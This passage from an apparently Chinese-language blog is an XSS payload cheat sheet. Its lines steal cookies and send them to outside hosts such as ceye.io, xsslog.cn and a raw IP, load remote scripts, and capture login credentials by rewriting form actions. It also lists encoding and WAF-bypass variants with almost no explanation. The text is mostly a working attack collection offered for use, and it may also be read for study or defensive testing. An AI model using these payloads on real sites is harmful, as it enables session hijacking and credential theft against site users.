class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">use</span> <span class="attr">xlink:href</span>=<span class="string">&quot;data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+DQo8YSB4bGluazpocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KGxvY2F0aW9uKSI+PHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiIC8+PC9hPg0KPC9zdmc+#rectangle&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+&quot;</span> <span class="attr">type</span>=<span class="string">&quot;image/svg+xml&quot;</span> <span class="attr">AllowScriptAccess</span>=<span class="string">&quot;always&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://xxx:7777/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>挑几个比较常见的：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">http://damit5.kiwi/xss.js</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SVG</span> <span class="attr">ONLOAD</span>=<span class="string">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SVG</span> <span class="attr">ONLOAD</span>=<span class="string">&quot;window.open(&#x27;xxx&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>nmask<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:confirm(&#x27;xxx&#x27;)&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;nofollow&quot;</span>&gt;</span>你可以点击我触发<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>/*<span class="attr">sv</span>=<span class="string">x</span> */<span class="attr">onerror</span>=<span class="string">alert()</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alt</span>=<span class="string">&#x27;&#x27;</span>+<span class="attr">document.domain</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;X&quot;</span> <span class="attr">onerror</span>=<span class="string">(a</span>=<span class="string">alert,b</span>=<span class="string">document[</span>&#x27;\<span class="attr">x63</span>\<span class="attr">x6f</span>\<span class="attr">x6f</span>\<span class="attr">x6b</span>\<span class="attr">x69</span>\<span class="attr">x65</span>&#x27;],<span class="attr">a</span>(<span class="attr">b</span>))&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">&lt;svg/onload=alert(1)&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://xxx:7777/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">doucment.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;xxx&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;xxx&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>总之就是src或者onload()</p>
+<p>一些基于事件的跳转：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">onclick=document.write(document.cookie)</span><br><span class="line">self[Object.keys(self)[5]](&quot;foo&quot;) // alert(&quot;foo&quot;)</span><br><span class="line">constructor.constructor(alert(1))</span><br><span class="line">eval(&#x27;alert(1)&#x27;)</span><br><span class="line">[1].find(alert);</span><br><span class="line">[self.alert(1)]</span><br><span class="line">top[&#x27;al\x65rt&#x27;](2);</span><br><span class="line">top[&quot;al&quot;+&quot;ert&quot;](3);</span><br><span class="line">setTimeout(&#x27;ale&#x27;+&#x27;rt(4)&#x27;);</span><br><span class="line">Function(&quot;ale&quot;+&quot;rt(5)&quot;)();</span><br><span class="line">new Function`al\ert\`6\``;</span><br><span class="line">setInterval(&#x27;ale&#x27;+&#x27;rt(7)&#x27;);</span><br><span class="line">top[/al/.source+/ert/.source](9);</span><br><span class="line">open(&#x27;java&#x27;+&#x27;script:ale&#x27;+&#x27;rt(10)&#x27;);</span><br><span class="line">top[8680439..toString(30)](8);    // 使用parseInt(&quot;alert&quot;,30)生成</span><br><span class="line">self[9350252032..toString(30)](1) // confirm(1)</span><br></pre></td></tr></table></figure>
+<p>一些事件，比如onclick，onerror可以使用</p>
+<p>一些伪协议：</p>
+<p>如果url跳转的地址可控，且存在于<code>&lt;a&gt;</code>标签中，可以利用伪协议进行xss</p>
+<p>对，xss中也有伪协议</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 某渗透测试的xss payload，经测试发现可以利用%09绕过等号附近的拦截，|拦截src --&gt;</span></span><br><span class="line">&lt;image/src=| onerror = javascript:alert(111)&gt;</span><br><span class="line"><span class="comment">&lt;!-- 经过html实体编码后的payload，绕waf --&gt;</span></span><br><span class="line">&lt;image/src=| onerror = &amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;#x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x31&amp;#x31&amp;#x31&amp;#x29&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript://www.baidu.com/%E2%80%A8alert(1)</span><br><span class="line">javascript:location.href=&#x27;http://127.0.0.1:8999/username=&#x27;+document.getElementsByName(&#x27;username&#x27;)[1]._value+&#x27;&amp;password=&#x27;+document.getElementsByName(&#x27;password&#x27;)[1]._value</span><br></pre></td></tr></table></figure>
+<p>markdown xss</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[a](javascript:prompt(document.cookie))</span><br><span class="line">[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))</span><br><span class="line">&lt;&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;  </span><br><span class="line">![a&#x27;&quot;`onerror=prompt(document.cookie)](x)</span><br><span class="line">[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)</span><br><span class="line">[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)</span><br><span class="line">![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>xml xss</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">x:script</span> <span class="attr">xmlns:x</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">x:script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x:script</span> <span class="attr">xmlns:x</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//brutelogic.com.br/1.js&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>获取cookie：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">with(document)body.appendChild(document.createElement(</span>&#x27;<span class="attr">script</span>&#x27;))<span class="attr">.src</span>=<span class="string">&quot;js地址&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(atob(</span>&#x27;<span class="attr">cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8vNjYuMTEyLjIxMy43Njo4MS9CbHVlTG90dXNfWFNTUmVjZWl2ZXIvdGVtcGxhdGUvZGVmYXVsdC5qcyc</span>=<span class="string">&#x27;))&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;img src=&quot;x&quot; onerror=&quot;$.getScript(&#x27;</span><span class="attr">http:</span>//<span class="attr">x.xsslog.cn</span>/<span class="attr">xxxxx</span>&#x27;)&quot;&gt;</span> <span class="comment">&lt;!-- 需要 jquery 的支持 --&gt;</span></span><br><span class="line">&lt;img/src/onerror=this.src=&#x27;//baidu.com/?&#x27;+document.cookie&gt;</span><br><span class="line"><span class="comment">&lt;!--# 分段构造--&gt;</span></span><br><span class="line">&lt;img/src/onerror=a=document;&gt;</span><br><span class="line">&lt;img/src/onerror=s=a.createElement(&#x27;script&#x27;);&gt;</span><br><span class="line">&lt;img/src/onerror=body.appendChild(s);&gt;</span><br><span class="line">&lt;img/src/onerror=s.src=&#x27;https://vxss.cc/r7K6&#x27;&gt;</span><br><span class="line">&lt;svg/onload=&quot;document.location=&#x27;http://72sf9a.ceye.io/?&#x27;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>一些登录劫持手法</p>
+<p>适用于某些登录页面存在xss，通过特殊js代码获取到账号密码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 输入就弹窗，初始代码 --&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;ccc&quot;</span> type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;1&quot;</span> size=<span class="string">&quot;20&quot;</span> /&gt;&lt;br /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="type">var</span> <span class="variable">input</span> <span class="operator">=</span> document.getElementById(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    input.oninput = function()&#123;</span><br><span class="line">        alert(input.value);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 输入就弹窗，缩一行 --&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;ccc&quot;</span> type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;xxx&quot;</span> size=<span class="string">&quot;20&quot;</span> /&gt;&lt;br /&gt;</span><br><span class="line">&lt;svg/onload=<span class="string">&quot;var input = document.getElementById(&#x27;xxx&#x27;);input.oninput = function()&#123;alert(input.value);&#125;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>可以将其改成跳转</p>
+<p>修改action：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;xxx.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">id</span>=<span class="string">&quot;sss&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;xxx&quot;</span> <span class="attr">id</span>=<span class="string">&quot;xxx&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&lt;svg/onload=&quot;var form1 = document.getElementById(&#x27;sss&#x27;);form1.action = &#x27;http://127.0.0.1/out.php&#x27;;&quot;&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 没有id 没有 name 可以通过 getElementsByTagName 来修改 --&gt;</span></span><br><span class="line">&lt;svg/onload=&quot;var form1 = document.getElementsByTagName(&#x27;form&#x27;)[0];form1.action = &#x27;http://127.0.0.1/out.php&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>按钮属性添加：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(&quot;.news[type=submit]&quot;)[0].setAttribute(&quot;onclick&quot;, &quot;alert(&quot;Password:&quot; + document.getElementsByName(&#x27;Password&#x27;)[0].value)&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>url跳转：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redirectUrl=javascript:location.href=&#x27;http://127.0.0.1:8999/username=&#x27;+document.getElementsByName(&#x27;username&#x27;)[1]._value+&#x27;&amp;password=&#x27;+document.getElementsByName(&#x27;password&#x27;)[1]._value</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>通过post请求获取：</p>
+<p>xhr</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 纯js请求获取token -&gt; 正则表达式</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;https://m.gm7.org/&quot;</span>,<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">    xmlhttp.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">    xmlhttp.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">      &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span> &amp;&amp; xmlhttp.<span class="property">status</span>==<span class="number">200</span>)</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(xmlhttp.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>ajax：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">      url:&#x27;api/change.php&#x27;,</span><br><span class="line">      type:&#x27;post&#x27;,</span><br><span class="line">      data:&#123;</span><br><span class="line">        p:&#x27;newpass&#x27;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1><span id="xss-bypass"> XSS Bypass</span></h1>
+<p>常规手法：</p>
+<ol>
+<li>编码</li>
+<li>注释</li>
+<li>大小写</li>
+<li>双写</li>
+<li>参数污染</li>
+<li>超长垃圾数据</li>
+</ol>
+<h2><span id="编码"> 编码</span></h2>
+<p>xssor：<a target="_blank" rel="noopener" href="https://evilcos.me/lab/xssor/">https://evilcos.me/lab/xssor/</a></p>
+<p>一个编码网站</p>
+<p>利用这个xssor编码后用在on事件之后，也可以用在eval当中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x002f;&amp;#x0078;&amp;#x0073;&amp;#x0073;&amp;#x002f;&amp;#x0029;&gt;</span><br><span class="line">&lt;script&gt;eval(&quot;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>html实体编码：<code>&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x29;</code></li>
+<li>进制：<code>\x61\x6c\x65\x72\x74\x60\x78\x73\x73\x60</code></li>
+<li>unicode：<code>\u0061\u006c\u0065\u0072\u0074\u0060\u4e2d\u6587\u4e5f\u53ef\u4ee5\u0060</code></li>
+<li>转义：就是单纯的：<code>\'、\&lt;、\&gt;</code></li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 经过html实体编码后的payload，绕waf --&gt;</span></span><br><span class="line">&lt;image/src=| onerror = &amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;#x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x31&amp;#x31&amp;#x31&amp;#x29&gt;</span><br></pre></td></tr></table></figure>
+<p>其他编码：</p>
+<p>jsfuck：<a target="_blank" rel="noopener" href="http://www.jsfuck.com/">http://www.jsfuck.com/</a></p>
+<p>jjencode：<a target="_blank" rel="noopener" href="https://utf-8.jp/public/jjencode.html">jjencode - Encode any JavaScript program using only symbols (utf-8.jp)</a></p>
+<h2><span id="eval函数"> eval函数</span></h2>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">十六进制</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="string">&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x78\x78\x78\x27\x29&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">ASCII</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span> <span class="attr">onerror</span>=<span class="string">eval(String.fromCharCode(97,108,101,114,116,40,39,120,120,122,122,39,41))</span>&gt;</span></span><br><span class="line"></span><br><span class="line">其他</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="title class_">String</span>.\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\<span class="title function_">u0065</span>(<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x74</span>,<span class="number">0x28</span>,<span class="number">0x31</span>,<span class="number">0x29</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2><span id="绕过lt过滤"> 绕过&lt;过滤</span></h2>
+<p>可能可以通过一些特殊编码绕过：</p>
+<p>fuzz：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;</span><br><span class="line">%3C</span><br><span class="line">%253C</span><br><span class="line">%25253C</span><br><span class="line">&amp;lt</span><br><span class="line">&amp;lt;</span><br><span class="line">&amp;LT</span><br><span class="line">&amp;LT;</span><br><span class="line">&amp;#60</span><br><span class="line">&amp;#060</span><br><span class="line">&amp;#0060</span><br><span class="line">&amp;#00060</span><br><span class="line">&amp;#000060</span><br><span class="line">&amp;#0000060</span><br><span class="line">&amp;#60;</span><br><span class="line">&amp;#060;</span><br><span class="line">&amp;#0060;</span><br><span class="line">&amp;#00060;</span><br><span class="line">&amp;#000060;</span><br><span class="line">&amp;#0000060;</span><br><span class="line">&amp;#x3c</span><br><span class="line">&amp;#x03c</span><br><span class="line">&amp;#x003c</span><br><span class="line">&amp;#x0003c</span><br><span class="line">&amp;#x00003c</span><br><span class="line">&amp;#x000003c</span><br><span class="line">&amp;#x3c;</span><br><span class="line">&amp;#x03c;</span><br><span class="line">&amp;#x003c;</span><br><span class="line">&amp;#x0003c;</span><br><span class="line">&amp;#x00003c;</span><br><span class="line">&amp;#x000003c;</span><br><span class="line">&amp;#X3c</span><br><span class="line">&amp;#X03c</span><br><span class="line">&amp;#X003c</span><br><span class="line">&amp;#X0003c</span><br><span class="line">&amp;#X00003c</span><br><span class="line">&amp;#X000003c</span><br><span class="line">&amp;#X3c;</span><br><span class="line">&amp;#X03c;</span><br><span class="line">&amp;#X003c;</span><br><span class="line">&amp;#X0003c;</span><br><span class="line">&amp;#X00003c;</span><br><span class="line">&amp;#X000003c;</span><br><span class="line">&amp;#x3C</span><br><span class="line">&amp;#x03C</span><br><span class="line">&amp;#x003C</span><br><span class="line">&amp;#x0003C</span><br><span class="line">&amp;#x00003C</span><br><span class="line">&amp;#x000003C</span><br><span class="line">&amp;#x3C;</span><br><span class="line">&amp;#x03C;</span><br><span class="line">&amp;#x003C;</span><br><span class="line">&amp;#x0003C;</span><br><span class="line">&amp;#x00003C;</span><br><span class="line">&amp;#x000003C;</span><br><span class="line">&amp;#X3C</span><br><span class="line">&amp;#X03C</span><br><span class="line">&amp;#X003C</span><br><span class="line">&amp;#X0003C</span><br><span class="line">&amp;#X00003C</span><br><span class="line">&amp;#X000003C</span><br><span class="line">&amp;#X3C;</span><br><span class="line">&amp;#X03C;</span><br><span class="line">&amp;#X003C;</span><br><span class="line">&amp;#X0003C;</span><br><span class="line">&amp;#X00003C;</span><br><span class="line">&amp;#X000003C;</span><br><span class="line">\x3c</span><br><span class="line">\x3C</span><br><span class="line">\u003c</span><br><span class="line">\u003C</span><br></pre></td></tr></table></figure>
+<h2><span id="关键词"> 关键词</span></h2>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document . cookie</span><br><span class="line">document/*xxx*/./*xxx*/cookie</span><br></pre></td></tr></table></figure>
+<p>这个是%09还是空格，都可以试试</p>
+<h2><span id="空格"> 空格</span></h2>
+<p><code>/**/</code>内联注释</p>
